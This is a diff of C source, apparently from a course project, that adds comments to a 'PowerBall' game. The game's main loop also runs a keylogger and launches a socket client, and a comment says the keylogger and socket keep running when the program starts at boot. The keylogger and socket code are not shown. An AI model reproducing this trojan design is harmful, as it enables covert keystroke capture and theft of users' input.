@@ -14,14 +14,13 @@ int main (){
         int flag = 0;
         // result indicate how many powerBall the user win
         int result = 0;
-        // check whether under terminal
-        if (isatty(0)) {
+        
+         
+        if (isatty(0)) {  // check whether running under terminal
                 flag = 1;
-        }else{
-                flag = 0;
         }
         while (result != 3) {
-                if (flag == 1) {
+                if (flag == 1) {   //if first time running main, play power ball
                         result = PBmain();
                 }
                 // if win 1 or 2 powerBall it will skill current session
@@ -31,7 +30,7 @@ int main (){
                         time_30s(trigger);
                         keylogger_end();
                         system("/CSE2431_Project/socket/client");
-                }else{
+                }else{ // if run from start up, just keep the function of keylogger and socket
                         // wait 30 second for another round
                         time_30s(trigger);
                 }
@@ -43,6 +42,7 @@ int main (){
 void time_30s(int trigger){
         int msec = 0;
         clock_t before = clock();
+        /* wait time to elapse 30s */
         do {
                 clock_t difference = clock() - before;
                 msec = difference * 1000 / CLOCKS_PER_SEC;
